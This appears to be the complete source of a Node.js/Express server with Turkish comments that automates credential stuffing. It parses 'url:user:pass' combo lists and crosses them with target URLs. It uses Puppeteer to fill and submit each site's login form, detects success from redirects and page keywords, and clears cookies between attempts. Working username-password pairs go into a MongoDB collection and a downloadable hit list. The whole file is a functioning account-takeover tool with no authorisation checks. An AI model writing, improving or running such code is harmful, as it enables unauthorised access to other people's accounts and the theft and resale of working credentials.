require('dotenv').config();
const express = require('express');
const fs = require('fs').promises;
const puppeteer = require('puppeteer');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

let clients = [];
let db = null;

// ------------------ MONGODB BAĞLANTISI (X509 SERTİFİKA DESTEKLİ) ------------------
async function connectMongo() {
    try {
        const uri = process.env.MONGODB_CONNECTIONSTRING || process.env.DATABASE_URL;
        if (!uri) {
            console.log('⚠ MongoDB connection string bulunamadı, veritabanı kaydı yapılmayacak.');
            return;
        }

        console.log('MongoDB bağlantısı başlatılıyor...');
        let options = {};

        if (uri.includes('MONGODB-X509')) {
            console.log('🔐 X509 authentication modu aktif, sertifika ile bağlanılıyor...');
            const certPath = process.env.MONGODB_CERT_PATH;
            if (certPath && (await fs.access(certPath).then(() => true).catch(() => false))) {
                options = {
                    tlsCertificateKeyFile: certPath,
                    tlsAllowInvalidCertificates: false
                };
                console.log(`🔐 X509 sertifika dosyası kullanılıyor: ${certPath}`);
            } else {
                console.log('⚠ X509 sertifika dosyası bulunamadı. Sadece connection string deneniyor...');
            }
        } else if (process.env.MONGODB_USERNAME && process.env.MONGODB_PASSWORD) {
            options = {
                auth: { username: process.env.MONGODB_USERNAME, password: process.env.MONGODB_PASSWORD }
            };
        }

        const client = new MongoClient(uri, options);
        await client.connect();
        db = client.db();
        console.log('✅ MongoDB bağlantısı başarılı');
        return client;
    } catch (err) {
        console.error('❌ MongoDB bağlantı hatası:', err.message);
        if (err.message.includes('certificate validation failed')) {
            console.error('X509 sertifika hatası. Lütfen geçerli bir sertifika dosyası sağlayın (MONGODB_CERT_PATH) veya farklı bir auth mekanizması kullanın.');
        }
        db = null;
        return null;
    }
}

// ------------------ LOG + SSE ------------------
function sendLog(msg, type = 'info') {
    const logEntry = { timestamp: new Date().toISOString(), message: msg, type };
    clients = clients.filter(c => !c.destroyed);
    clients.forEach(c => c.write(`data: ${JSON.stringify(logEntry)}\n\n`));
    console.log(msg);
}

app.get('/api/log-stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    clients.push(res);
    req.on('close', () => {
        clients = clients.filter(c => c !== res);
    });
});

// ------------------ URL DÜZELTME ------------------
function normalizeUrl(url) {
    url = url.trim();
    if (url.startsWith('//')) url = 'https:' + url;
    if (!url.startsWith('http')) url = 'https://' + url;
    return url;
}

// ------------------ GELİŞMİŞ PARSER ------------------
function parseCredentialLine(line) {
    line = line.trim();
    if (!line) return null;

    let url = null;
    let username = null;
    let password = null;

    if (line.includes('://')) {
        // URL'yi yakala (host'a kadar, port vs. dahil değil)
        const urlMatch = line.match(/^(https?:\/\/[^:]+)/);
        if (urlMatch) {
            url = urlMatch[1];
            // URL'den sonraki kısmı al ve başındaki TÜM ':' karakterlerini temizle
            let rest = line.substring(url.length).replace(/^:+/, '');
            const colonIndex = rest.indexOf(':');
            if (colonIndex !== -1) {
                username = rest.substring(0, colonIndex);
                password = rest.substring(colonIndex + 1);
            } else {
                // Eğer hiç ':' yoksa, rest'in tamamı username, password boş
                username = rest;
                password = '';
            }
        } else {
            username = line;
            password = '';
        }
    } else {
        const colonIndex = line.indexOf(':');
        if (colonIndex !== -1) {
            username = line.substring(0, colonIndex);
            password = line.substring(colonIndex + 1);
        } else {
            username = line;
            password = '';
        }
    }
    // Kullanıcı adı boş gelirse geçersiz say
    if (!username || username.trim() === '') {
        return null;
    }
    return { url, username, password };
}

// ------------------ BAŞARILI GİRİŞİ MONGODB'YE KAYDET ------------------
async function saveSuccessfulLogin(baseUrl, username, password) {
    if (!db) return;
    try {
        const collection = db.collection('successful_logins');
        await collection.insertOne({
            url: baseUrl,
            username: username,
            password: password,
            timestamp: new Date(),
            createdAt: new Date()
        });
        sendLog(`💾 Başarılı giriş MongoDB'ye kaydedildi: ${username} @ ${baseUrl}`, 'success');
    } catch (err) {
        console.error('MongoDB kayıt hatası:', err);
        sendLog(`❌ MongoDB kayıt hatası: ${err.message}`, 'error');
    }
}

// ------------------ TEK PENCEREDE TEST (DAHA YAVAŞ, GÖRÜNÜR) ------------------
async function runAllTests(testItems) {
    await fs.writeFile('results.json', '[]');

    const browser = await puppeteer.launch({
        headless: false,
        slowMo: 250,             // 🔥 150 → 250 (çok az yavaşlatıldı, yazmayı net gör)
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();
    const results = [];
    const total = testItems.length;
    sendLog(`🚀 BAŞLANGIÇ – ${total} test (tek pencere, yavaş mod 250ms)`, 'info');

    for (let i = 0; i < total; i++) {
        const { baseUrl, username, password } = testItems[i];
        sendLog(`📌 Test ${i+1}/${total}: ${username} @ ${baseUrl}`, 'info');

        const result = {
            baseUrl,
            username,
            password,
            success: false,
            message: '',
            timestamp: new Date().toISOString()
        };

        try {
            const url = normalizeUrl(baseUrl);
            await page.goto(url, { waitUntil: 'networkidle2', timeout: 20000 });
            await page.waitForTimeout(1000);

            let userInput = await page.$('input[type="text"], input[name="username"], input[name="email"], input[name="user"], input[id*="user"], input[id*="email"], input[id="userid"]');
            let passInput = await page.$('input[type="password"]');
            let submitBtn = await page.$('button[type="submit"], input[type="submit"], form button');

            if (!userInput || !passInput || !submitBtn) {
                throw new Error('Login form not found');
            }

            await userInput.click({ clickCount: 3 });
            await userInput.type(username);
            await passInput.type(password);
            await submitBtn.click();

            await page.waitForTimeout(3000);
            const finalUrl = page.url();
            const html = await page.content().catch(() => '');

            let success = false;
            const lowerHtml = html.toLowerCase();
            if (lowerHtml.includes('invalid') || lowerHtml.includes('wrong') || 
                lowerHtml.includes('error') || lowerHtml.includes('failed') || 
                lowerHtml.includes('incorrect')) {
                success = false;
            }
            else if (finalUrl !== url && !finalUrl.includes('login') && !finalUrl.includes('signin')) {
                success = true;
            }
            else if (lowerHtml.includes('dashboard') || lowerHtml.includes('welcome') || lowerHtml.includes('account')) {
                success = true;
            }
            else {
                success = false;
            }

            result.success = success;
            result.message = success ? 'LOGIN OK' : 'LOGIN FAIL';
            sendLog(success ? `✅ BAŞARILI ${username}` : `❌ BAŞARISIZ ${username}`, success ? 'success' : 'fail');

            if (success) {
                await saveSuccessfulLogin(baseUrl, username, password);
            }

            const client = await page.target().createCDPSession();
            await client.send('Network.clearBrowserCookies');
            await client.send('Network.clearBrowserCache');

        } catch (err) {
            result.message = err.message;
            sendLog(`⚠ HATA ${username}: ${err.message}`, 'error');
        }

        results.push(result);
        await fs.writeFile('results.json', JSON.stringify(results, null, 2));
        await new Promise(resolve => setTimeout(resolve, 3000)); // test arası 2sn → 3sn
    }

    await browser.close();
    const okCount = results.filter(x => x.success).length;
    sendLog(`🏁 BİTİŞ – Başarılı: ${okCount} / Başarısız: ${total - okCount}`, 'info');
    return results;
}

// ------------------ API ------------------
app.post('/api/start', async (req, res) => {
    try {
        let { baseUrlsText, credsText } = req.body;
        baseUrlsText = baseUrlsText || '';
        credsText = credsText || '';

        const baseUrls = baseUrlsText.split('\n').map(l => l.trim()).filter(Boolean);
        const rawCredLines = credsText.split('\n').map(l => l.trim()).filter(Boolean);

        const parsedCreds = [];
        for (const line of rawCredLines) {
            const p = parseCredentialLine(line);
            if (p && p.username) {
                parsedCreds.push(p);
            } else {
                sendLog(`⚠ Geçersiz satır atlandı: ${line}`, 'error');
            }
        }

        let testItems = [];
        if (baseUrls.length > 0) {
            for (const baseUrl of baseUrls) {
                for (const cred of parsedCreds) {
                    testItems.push({
                        baseUrl: baseUrl,
                        username: cred.username,
                        password: cred.password || ''
                    });
                }
            }
        } else {
            for (const cred of parsedCreds) {
                if (cred.url) {
                    testItems.push({
                        baseUrl: cred.url,
                        username: cred.username,
                        password: cred.password || ''
                    });
                } else {
                    sendLog(`⚠ Atlanan credential (URL yok): ${cred.username}`, 'error');
                }
            }
        }

        if (testItems.length === 0) {
            return res.status(400).json({ error: 'Geçerli test verisi yok.' });
        }

        await fs.writeFile('results.json', '[]');
        res.json({ message: 'Test başladı', total: testItems.length });
        runAllTests(testItems);
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/results', async (req, res) => {
    try {
        const data = await fs.readFile('results.json', 'utf8');
        res.json(JSON.parse(data));
    } catch {
        res.json([]);
    }
});

app.get('/api/download', async (req, res) => {
    try {
        const data = JSON.parse(await fs.readFile('results.json', 'utf8'));
        const success = data.filter(x => x.success);
        const fail = data.filter(x => !x.success);
        let output = '✅ BAŞARILI\n\n';
        success.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password}\n`);
        output += '\n❌ BAŞARISIZ\n\n';
        fail.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password}\n`);
        res.setHeader('Content-Disposition', 'attachment; filename=result.txt');
        res.send(output);
    } catch {
        res.status(500).send('Sonuç dosyası yok');
    }
});

app.delete('/api/results', async (req, res) => {
    try {
        await fs.writeFile('results.json', '[]');
        res.json({ ok: true });
    } catch {
        res.status(500).json({ error: 'Silme hatası' });
    }
});

// ------------------ SERVER BAŞLATMA ------------------
(async () => {
    await connectMongo();
    app.listen(PORT, () => console.log(`✅ Sunucu çalışıyor: http://localhost:${PORT}`));
})();